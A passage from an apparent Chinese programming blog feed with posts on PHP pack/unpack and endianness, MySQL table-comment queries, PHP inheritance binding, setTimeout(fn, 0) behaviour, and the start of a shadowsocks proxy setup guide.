<p>首先是读取十进制，所以0x5会转成十进制的5，然后以半字节为单位并且以十六进制方式读取，为了补足8位，所以需要在5后面补0，变成0x50。别忘了十六进制的一位相当于二进制的四位。0x50正好是字符P的ASCII码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . chr(<span class="number">0x50</span>) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php -f pack.php</span><br><span class="line">output: P</span><br></pre></td></tr></table></figure>

<p>h和H的差别在于h是低位在前，H是高位在前，拿前面的例子来看看h的行为：  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$bin = pack(<span class="string">"h"</span>, <span class="number">0x5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . $bin . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . ord($bin) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php -f pack.php</span><br><span class="line">output:</span><br><span class="line">output: 5</span><br></pre></td></tr></table></figure>


<p>读取十进制的5，后面补0，变成十六进制的0x50，因为H是高位在前，所以没有变化，而h就需要将0x50变成0x05。由于0x05是不可见字符，所以上面的字符输出是空的。</p>
<p>h和H是以半字节为单位，h2和H2则表示一次读取8位，同理h3和H3可以推导出来，但是别忘了补足8位.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . pack(<span class="string">"H"</span>, <span class="number">0x47</span>) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php -f pack.php</span><br><span class="line">output: p</span><br></pre></td></tr></table></figure>



<p>以上的代码中，0x47为十进制的71，因为读取半个字节，所以变成0x7，后面补0变成0x70，则刚好是字符p的ASCII码。如果换成是h格式化，则最终的结果是0x07，因为低位在前。</p>
<p>对于一次读取多个字节，也以同样的规则：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . pack(<span class="string">"H2h2"</span>, <span class="number">0x47</span>, <span class="number">0x56</span>) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php -f pack.php</span><br><span class="line">output: qh</span><br></pre></td></tr></table></figure>

<p>0x47是十进制的71，由于使用H2格式化，所以一次读取8位，最后变成十六进制的0x71，即字符q的ASCII码。0x56是十进制的86，由于使用h2格式化，所以一次读取8位，最后变成十六进制的0x86，但是由于h表示低位在前，因此0x86变成0x68，即字符h的ASCII码。</p>
<ul>
<li>c和C都表示字符，前者表示有符号字符，后者表示无符号字符。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . pack(<span class="string">"c"</span>, <span class="number">65</span>) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . pack(<span class="string">"C"</span>, <span class="number">65</span>) . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">```s</span><br><span class="line">$ php -f pack.phpoutput: A</span><br><span class="line">output: A</span><br></pre></td></tr></table></figure>

<ul>
<li>s为有符号短整数；S为无符号短整数。它们都为主机字节序，并且为16位。通常为主机字节序的格式化字符，一般只用于单机的操作，因为你无法确定主机字节序究竟是大端还是小端。当然，你一定要这么干的话，也是有办法来获取本机字节序是属于大端或小端，但那样是没有必要的。稍后就会给出一个通过PHP来判断字节序的例子。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$bin1 = pack(<span class="string">"s"</span>, <span class="number">345</span>);</span><br><span class="line">$bin2 = pack(<span class="string">"S"</span>, <span class="number">452</span>);</span><br><span class="line">print_r(unpack(<span class="string">"sshort1"</span>, $bin1));</span><br><span class="line">print_r(unpack(<span class="string">"sshort2"</span>, $bin2));</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php -f pack.php</span><br><span class="line">Array(</span><br><span class="line">    [short1] =&gt; 345</span><br><span class="line">)</span><br><span class="line">Array(</span><br><span class="line">    [short2] =&gt; 452</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<ul>
<li><p>n和v除了明确指定了字节序，其它行为跟s和S是一样的。</p>
</li>
<li><p>i和I依赖于机器大小及字节序，很少用它们。</p>
</li>
<li><p>l、L、N、V跟s、S、n、v类似，除了表示的大小不同，前者都为32位，后者都为16位。</p>
</li>
<li><p>f、d是因为float和double与CPU无关。一般来说，编译器是按照IEEE标准解释的，即把float/double看作4/8个字符的数组进行解释。因此，只要编译器是支持IEEE浮点标准的，就不需要考虑字节顺序。</p>
</li>
<li><p>剩下的x、X和@用得比较少，对此不作深究。</p>
</li>
</ul>
<h4 id="unpack的用法"><a href="#unpack的用法" class="headerlink" title="unpack的用法"></a>unpack的用法</h4><p>unpack是用来解包经过pack打包的数据包，如果成功，则返回数组。其中格式化字符和执行pack时一一对应，但是需要额外的指定一个key，用作返回数组的key。多个字段用/分隔。例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$bin = @pack(<span class="string">"a9SS"</span>, <span class="string">"Subscriptions"</span>, <span class="number">20</span>, <span class="number">1</span>);</span><br><span class="line">$data = @unpack(<span class="string">"a9name/sage/Sgender"</span>, $bin);</span><br><span class="line"><span class="keyword">if</span> (is_array($data))&#123;</span><br><span class="line">    print_r($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php  -f pack.php</span><br><span class="line">Array(</span><br><span class="line">    [name] =&gt; Subscriptions</span><br><span class="line">    [age] =&gt; 20</span><br><span class="line">    [gender] =&gt; 1</span><br><span class="line">)</span><br></pre></td></tr></table></figure>


<h4 id="一些例子"><a href="#一些例子" class="headerlink" title="一些例子"></a>一些例子</h4><ul>
<li><p>判断大小端</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">IsBigEndian</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $bin = pack(<span class="string">"L"</span>, <span class="number">0x12345678</span>);</span><br><span class="line">    $hex = bin2hex($bin);</span><br><span class="line">    <span class="keyword">if</span> (ord(pack(<span class="string">"H2"</span>, $hex)) === <span class="number">0x78</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (IsBigEndian()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"大端序"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"小端序"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>网络通信</p>
<p>  比如现在要通过PHP发送数据包到服务器来登录。在仅需要提供用户名(最多30个字节)和密码(md5之后固定为32字节)的情况下，可以构造如下数据包(当然这事先需要跟服务器协商好数据包的规范，本例以网络字节序通信)：</p>
<p>  包结构：</p>
<table>
<thead>
<tr>
<th align="left">字段</th>
<th align="left">字节数</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">包头</td>
<td align="left">定长</td>
<td align="left">每一个通信消息必须包含的内容</td>
</tr>
<tr>
<td align="left">包体</td>
<td align="left">不定长</td>
<td align="left">根据每个通信消息的不同产生变化</td>
</tr>
</tbody></table>
<p>  其中包头详细内容如下：</p>
<table>
<thead>
<tr>
<th align="left">字段</th>
<th align="left">字节数</th>
<th align="left">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">pkg_len</td>
<td align="left">2</td>
<td align="left">ushort</td>
<td align="left">整个包的长度，不超过4K</td>
</tr>
<tr>
<td align="left">version</td>
<td align="left">1</td>
<td align="left">uchar</td>
<td align="left">通讯协议版本号</td>
</tr>
<tr>
<td align="left">command_id</td>
<td align="left">2</td>
<td align="left">ushort</td>
<td align="left">消息命令ID</td>
</tr>
<tr>
<td align="left">result</td>
<td align="left">2</td>
<td align="left">short</td>
<td align="left">请求时不起作用；请求返回时使用&lt;</td>
</tr>
</tbody></table>
<p>  当然实际中可能会涉及到各种校验。本文为了简单，只是列举一下通常的工作流程及处理的方式。</p>
<p>  登录(执行命储1001)</p>
<table>
<thead>
<tr>
<th align="left">字段</th>
<th align="left">字节数</th>
<th align="left">类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">用户名</td>
<td align="left">30</td>
<td align="left">uchar[30]</td>
<td align="left">登录用户名</td>
</tr>
<tr>
<td align="left">密码</td>
<td align="left">32</td>
<td align="left">uchar[32]</td>
<td align="left">登录密码</td>
</tr>
</tbody></table>
<p>  包头是定长的，通过计算可知包头占7个字节，并且包头在包体之前。比如用户Subscriptions需要登录，密码是123456，则代码如下：</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$version    = <span class="number">1</span>;</span><br><span class="line">$result     = <span class="number">0</span>;</span><br><span class="line">$command_id = <span class="number">1001</span>;</span><br><span class="line">$username   = <span class="string">"Subscriptions"</span>;</span><br><span class="line">$password   = md5(<span class="string">"123456"</span>); <span class="comment">// 构造包体</span></span><br><span class="line">$bin_body   = pack(<span class="string">"a30a32"</span>, $username, $password);<span class="comment">// 包体长度</span></span><br><span class="line">$body_len   = strlen($bin_body);</span><br><span class="line">$bin_head   = pack(<span class="string">"nCns"</span>, $body_len, $version, $command_id, $result);</span><br><span class="line">$bin_data   = $bin_head . $bin_body;<span class="comment">// 发送数据</span></span><br><span class="line">socket_write($socket, $bin_data, strlen($bin_data));</span><br><span class="line">socket_close($socket);</span><br></pre></td></tr></table></figure>

<p>  服务器端通过读取定长包头，拿到包体长度，再读取并解析包体。大致的过程就是这样。当然服务器端也会返回响应包，客户端做相应的读取处理。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>mysql表字段信息查询</title>
    <url>/articles/mysql%E8%A1%A8%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<h4 id="新建表以及添加表和字段的注释"><a href="#新建表以及添加表和字段的注释" class="headerlink" title="新建表以及添加表和字段的注释"></a>新建表以及添加表和字段的注释</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_user(</span><br><span class="line"></span><br><span class="line">    <span class="keyword">ID</span> <span class="built_in">INT</span>(<span class="number">19</span>) primary <span class="keyword">key</span> auto_increment  <span class="keyword">comment</span> <span class="string">'主键'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="keyword">NAME</span> <span class="built_in">VARCHAR</span>(<span class="number">300</span>) <span class="keyword">comment</span> <span class="string">'姓名'</span>,</span><br><span class="line"></span><br><span class="line">    CREATE_TIME <span class="built_in">date</span> <span class="keyword">comment</span> <span class="string">'创建时间'</span></span><br><span class="line"></span><br><span class="line">) <span class="keyword">comment</span>  = <span class="string">'用户信息表'</span>;</span><br></pre></td></tr></table></figure>

<h4 id="修改表-字段的注释"><a href="#修改表-字段的注释" class="headerlink" title="修改表/字段的注释"></a>修改表/字段的注释</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> t_user <span class="keyword">comment</span>  = <span class="string">'修改后的表注释信息(用户信息表)'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> t_user <span class="keyword">modify</span> <span class="keyword">column</span> <span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">comment</span> <span class="string">'主键ID'</span>;</span><br></pre></td></tr></table></figure>

<p>–注意：字段名和字段类型照写就行</p>
<h4 id="查询数据库所有表的详细信息-包括表的注释"><a href="#查询数据库所有表的详细信息-包括表的注释" class="headerlink" title="查询数据库所有表的详细信息(包括表的注释)"></a>查询数据库所有表的详细信息(包括表的注释)</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> information_schema;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">TABLES</span> <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">'my_db'</span>;</span><br></pre></td></tr></table></figure>

<p>–查询某一张表的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> information_schema;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">TABLES</span> <span class="keyword">where</span> TABLE_SCHEMA=<span class="string">'my_db'</span> <span class="keyword">and</span> TABLE_NAME= <span class="string">'auth_user'</span>;</span><br></pre></td></tr></table></figure>

<h4 id="查询一张表的详细信息-包括字段注释-字段名称-类型等"><a href="#查询一张表的详细信息-包括字段注释-字段名称-类型等" class="headerlink" title="查询一张表的详细信息(包括字段注释,字段名称,类型等)"></a>查询一张表的详细信息(包括字段注释,字段名称,类型等)</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> information_schema;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema =<span class="string">'my_db'</span>  <span class="keyword">and</span> table_name = <span class="string">'auth_user'</span>;</span><br></pre></td></tr></table></figure>

<p>注:还有一种方式:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> my_db;</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">full</span> <span class="keyword">columns</span> <span class="keyword">from</span> auth_user;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>php继承相关的一个问题</title>
    <url>/articles/php%E7%BB%A7%E6%89%BF%E7%9B%B8%E5%85%B3%E7%9A%84%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>Code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"a"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;foo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'b'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;test(); <span class="comment">// a</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>当子类继承父类之后，this的指向是动态绑定的，也就是说，当父类的方法被重写之后，调用的就是子类的方法，没有重写，就调用父类的方法。</p>
</blockquote>
<p>在本文中，父类的foo方法是私有的，并没有继承给子类，也就没有重写之说，所以，根据前面的定论，没有重写就调用父类中的方法。所以就打印了’a’。</p>
<p>另外还有三种绑定方式，分别是 <code>self</code>  <code>parent</code>  <code>static</code>。</p>
<p>self是静态绑定，它的指向始终是在编译时所在的那个类。parnet也是静态绑定，它始终指向编译时所在类的父类，而这个父类是声明类时就指定了的，所以指向是明确的。static属于后期静态绑定，或者说是动态绑定或运行时绑定，它的指向与调用者有关。若调用者是所在类的实例，那么它就指向本类；若调用者是所在类子类的实例，它则指向子类。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>setTimeout(call,0)作用</title>
    <url>/articles/setTimeout-call-0-%E4%BD%9C%E7%94%A8/</url>
    <content><![CDATA[<p>经常看到setTimeout延时0ms的javascript代码，感到很迷惑，难道延时0ms和不延时不是一个道理吗？后来通过查资料以及实验得出以下两个作用，可能还有作用我还不知道，希望得知的朋友在后面评论上不吝指出。</p>
<h4 id="1-实现javascript的异步"><a href="#1-实现javascript的异步" class="headerlink" title="1. 实现javascript的异步"></a>1. 实现javascript的异步</h4><p>正常情况下javascript都是按照顺序执行的。但是我们可能让该语句后面的语句执行完再执行本身，这时就可以用到setTimeout延时0ms来实现了。 如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">alert(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="string">"alert(2)"</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">alert(<span class="number">3</span>);</span><br></pre></td></tr></table></figure>

<p>虽然延时了0ms,但是执行顺序为：1，3，2</p>
<p>这样就保证setTimeout里面的语句在某一代码段中最后执行。</p>
<h4 id="2-在事件中，setTimeout-会在其完成当前任何延宕事件的事件处理器的执行，以及完成文档当前状态更新后，告诉浏览器去启用-setTimeout-内注册的函数。"><a href="#2-在事件中，setTimeout-会在其完成当前任何延宕事件的事件处理器的执行，以及完成文档当前状态更新后，告诉浏览器去启用-setTimeout-内注册的函数。" class="headerlink" title="2. 在事件中，setTimeout 会在其完成当前任何延宕事件的事件处理器的执行，以及完成文档当前状态更新后，告诉浏览器去启用 setTimeout 内注册的函数。"></a>2. 在事件中，setTimeout 会在其完成当前任何延宕事件的事件处理器的执行，以及完成文档当前状态更新后，告诉浏览器去启用 setTimeout 内注册的函数。</h4><p>举个例子来说这句话的意思，假如当某个事件在页面上建立一个文本框，并给文本框赋值（完成文档当前状态更新），然后将焦点定到文本框，并且选中文本框的内容（后面部分就需要用到setTimeout 延迟0ms实现，否则不好实现）。</p>
<p>先看个例子：</p>
<pre><code class="html"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span>
<span class="tag">&lt;<span class="name">head</span>&gt;</span>
  <span class="tag">&lt;<span class="name">title</span>&gt;</span>setTimeout(call,0) demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span>
<span class="tag">&lt;/<span class="name">head</span>&gt;</span>
<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> &gt;</span>

<span class="javascript">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span>

<span class="javascript"> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">id</span>)</span>{</span>

<span class="javascript">    <span class="keyword">return</span> <span class="built_in">document</span>.getElementById(id);</span>
 }

<span class="javascript"> <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span>

<span class="javascript">    <span class="keyword">get</span>('makeinput').onmousedown = function(){</span>

<span class="javascript">    <span class="keyword">var</span> input = <span class="built_in">document</span>.createElement(<span class="string">'input'</span>);</span>

<span class="javascript">    input.setAttribute(<span class="string">'type'</span>, <span class="string">'text'</span>);</span>

<span class="javascript">    input.setAttribute(<span class="string">'value'</span>, <span class="string">'test1'</span>);</span>

<span class="javascript">    <span class="keyword">get</span>('inpwrapper').appendChild(input);</span>

    input.focus();

    input.select();

<span class="javascript">    <span class="keyword">get</span>('makeinput2').onmousedown = function(){</span>


<span class="javascript">    <span class="keyword">var</span> input = <span class="built_in">document</span>.createElement(<span class="string">'input'</span>);</span>

<span class="javascript">    input.setAttribute(<span class="string">'type'</span>, <span class="string">'text'</span>);</span>

<span class="javascript">    input.setAttribute(<span class="string">'value'</span>, <span class="string">'test1'</span>);</span>

<span class="javascript">    <span class="keyword">get</span>('inpwrapper2').appendChild(input);</span>

<span class="javascript">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span>
        input.focus();
        input.select();

    }, 0);

<span class="javascript">    <span class="keyword">get</span>('input1').onkeypress = function(){</span>


<span class="javascript">    <span class="keyword">get</span>('preview1').innerHTML = this.value;</span>

<span class="javascript">    <span class="keyword">get</span>('input2').onkeypress = function(){</span>
<span class="javascript">        setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{</span>
<span class="javascript">            <span class="keyword">get</span>('preview2').innerHTML = <span class="keyword">get</span>('input2').value;</span>
        },0 );
    } 
 } 
})();
<span class="tag">&lt;/<span class="name">script</span>&gt;</span>

<span class="tag">&lt;<span class="name">body</span>&gt;</span>
    <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>DEMO1<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span>
    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1、未使用 <span class="tag">&lt;<span class="name">code</span>&gt;</span>setTimeout<span class="tag">&lt;/<span class="name">code</span>&gt;</span>（未选中文本框内容）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>
    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"makeinput"</span>&gt;</span>生成 input<span class="tag">&lt;/<span class="name">button</span>&gt;</span>
    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"inpwrapper"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>

    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>2、使用 <span class="tag">&lt;<span class="name">code</span>&gt;</span>setTimeout<span class="tag">&lt;/<span class="name">code</span>&gt;</span>（立即选中文本框内容）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>

    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"makeinput2"</span>&gt;</span>生成 input<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span>

    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"inpwrapper2"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>

    --------------------------------------------------------------------------

    <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>DEMO2<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span>

    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1、未使用 <span class="tag">&lt;<span class="name">code</span>&gt;</span>setTimeout<span class="tag">&lt;/<span class="name">code</span>&gt;</span>(只有输入第二个字符时，前一个字符才显示出来)<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>

    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"input1"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"preview1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>

    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>2、使用 <span class="tag">&lt;<span class="name">code</span>&gt;</span>setTimeout<span class="tag">&lt;/<span class="name">code</span>&gt;</span>(输入时，字符同时显示出来)<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>

    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"input2"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"preview2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span>
<span class="tag">&lt;/<span class="name">body</span>&gt;</span>
<span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>
<h4 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h4><p>现有的 JavaScript 引擎是单线程处理任务的。它把任务放到队列中，不会同步去执行，必须在完成一个任务后才开始另外一个任务。其实，这是一个把需要执行的任务从队列中跳脱的技巧。在DEMO1中，JavaScript 引擎在执行 onmousedown时，由于没有多线程的同步执行，不可能同时去处理刚创建元素的 focus 和 select 方法，由于这两个方法都不在队列中，在完成 onmousedown 后，JavaScript 引擎已经丢弃了这两个任务，正如第一种情况。而在第二种情况中，由于setTimeout可以把任务从某个队列中跳脱成为新队列，因而能够得到期望的结果。</p>
]]></content>
      <categories>
        <category>前端开发</category>
      </categories>
      <tags>
        <tag>javascript异步</tag>
        <tag>setTimeout</tag>
      </tags>
  </entry>
  <entry>
    <title>shadowsock搭建服务端与客户端</title>
    <url>/articles/shadowsock%E6%90%AD%E5%BB%BA%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF/</url>
    <content><![CDATA[<p>1、安装 shadowsocks 服务端</p>
<p>ss 的客户端有很多语言实现，包括 Python、Go、libev等，这里使用广泛的 Python 后端。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install python-pip</span><br><span class="line"></span><br><span class="line">sudo pip install shadowsocks  （如果有安装过pip的可以不用重新安装pip了）</span><br></pre></td></tr></table></figure>

<p>此时系统会多出来两个程序：</p>
<p>/usr/bin/ssserver</p>
<p>/usr/bin/sslocal</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu-System:~$ ssserver -h</span><br><span class="line"></span><br><span class="line">usage: ssserver [OPTION]...</span><br><span class="line"></span><br><span class="line">A fast tunnel proxy that helps you bypass firewalls.</span><br><span class="line"></span><br><span class="line">You can supply configurations via either config file or command line arguments.</span><br><span class="line"></span><br><span class="line">Proxy options:</span><br><span class="line"></span><br><span class="line">-c CONFIG              path to config file</span><br><span class="line"></span><br><span class="line">-s SERVER_ADDR         server address, default: 0.0.0.0</span><br><span class="line"></span><br><span class="line">-p SERVER_PORT         server port, default: 8388</span><br><span class="line"></span><br><span class="line">-k PASSWORD            password</span><br><span class="line"></span><br><span class="line">-m METHOD              encryption method, default: aes-256-cfb</span><br><span class="line"></span><br><span class="line">-t TIMEOUT             timeout in seconds, default: 300</span><br><span class="line"></span><br><span class="line">--fast-open            use TCP_FASTOPEN, requires Linux 3.7+</span><br><span class="line"></span><br><span class="line">--workers WORKERS      number of workers, available on Unix/Linux</span><br><span class="line"></span><br><span class="line">--forbidden-ip IPLIST  comma seperated IP list forbidden to connect</span><br><span class="line"></span><br><span class="line">--manager-address ADDR optional server manager UDP address, see wiki</span><br><span class="line"></span><br><span class="line">General options:</span><br><span class="line"></span><br><span class="line">-h, --help             show this help message and exit</span><br><span class="line"></span><br><span class="line">-d start/stop/restart  daemon mode</span><br><span class="line"></span><br><span class="line">--pid-file PID_FILE    pid file for daemon mode</span><br><span class="line"></span><br><span class="line">--log-file LOG_FILE    log file for daemon mode</span><br><span class="line"></span><br><span class="line">--user USER            username to run as</span><br><span class="line"></span><br><span class="line">-v, -vv                verbose mode</span><br><span class="line"></span><br><span class="line">-q, -qq                quiet mode, only show warnings/errors</span><br><span class="line"></span><br><span class="line">--version              show version information</span><br><span class="line"></span><br><span class="line">Online help: https://github.com/shadowsocks/shadowsocks (Removed according to regulations.)</span><br></pre></td></tr></table></figure>

<p>2、配置shadowsocks</p>
<p>sudo gedit /etc/shadowsocks.json 然后会跳出一个文本框，粘贴以下内容</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    "server":"0.0.0.0", // 代理IP</span><br><span class="line"></span><br><span class="line">    "server_port":8899, // 代理端口</span><br><span class="line"></span><br><span class="line">    "local_address": "127.0.0.1",</span><br><span class="line"></span><br><span class="line">    "local_port":1080,</span><br><span class="line"></span><br><span class="line">    "password":"xxxxxxxx", //链接密码</span><br><span class="line"></span><br><span class="line">    "timeout":300,</span><br><span class="line"></span><br><span class="line">    "method":"aes-256-cfb",</span><br><span class="line"></span><br><span class="line">    "fast_open": true,</span><br><span class="line"></span><br><span class="line">    "workers": 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个端口只能连一个用户。多用户时使用如下配置:</p>
